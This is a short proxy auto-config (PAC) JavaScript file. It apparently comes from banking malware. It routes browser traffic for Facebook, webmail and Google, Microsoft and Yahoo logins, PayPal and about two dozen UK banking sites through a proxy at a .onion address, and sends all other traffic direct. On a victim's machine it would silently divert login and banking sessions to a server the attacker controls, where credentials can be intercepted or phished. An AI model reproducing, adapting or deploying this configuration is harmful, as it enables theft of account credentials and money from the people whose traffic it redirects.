function FindProxyForURL(url, host) {
    var proxy = "PROXY r7t6zvhfwph5f6d5.onion:88;";
    var hosts = new Array('*.facebook.com', '*.gmx.at', '*.gmx.ch', '*.gmx.com',
        '*.gmx.de', '*.gmx.net', 'accounts.google.com', 'mail.google.com',
        'login.live.com', 'login.yahoo.com', '*.paypal.com',
        '*barclays.co.uk', '*natwest.com', '*nwolb.com', 'hsbc.co.uk',
        'www.hsbc.co.uk', '*business.hsbc.co.uk', '*santander.co.uk',
        '*rbsdigital.com', 'onlinebusiness.lloydsbank.co.uk', '*cahoot.com',
        '*smile.co.uk', '*co-operativebank.co.uk', 'if.com', '*.if.com',
        '*ulsterbankanytimebanking.co.uk', '*sainsburysbank.co.uk',
        '*tescobank.com', '*halifax-online.co.uk', '*halifax.co.uk',
        '*lloydsbank.co.uk', '*lloydstsb.com');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(host, hosts[i])) {
            return proxy
        }
    }
    return "DIRECT"
}
